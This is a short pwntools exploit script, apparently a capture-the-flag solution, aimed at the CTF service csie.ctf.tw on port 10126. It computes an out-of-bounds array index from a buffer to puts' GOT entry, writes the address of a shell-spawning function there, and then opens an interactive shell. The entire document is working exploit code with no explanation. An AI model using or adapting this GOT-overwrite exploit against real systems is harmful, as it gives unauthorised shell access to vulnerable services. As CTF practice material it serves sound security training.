from pwn import *

r = remote("csie.ctf.tw", 10126)
context.arch = "amd64"

secret = 0x601080
puts_got = 0x601018
index = (puts_got - secret) / 8

shell = 0x400697

r.recvuntil("\n")
r.recvuntil("\n")
r.sendline(str(index))
r.recvuntil("\n")
r.sendline(str(shell))

r.interactive()
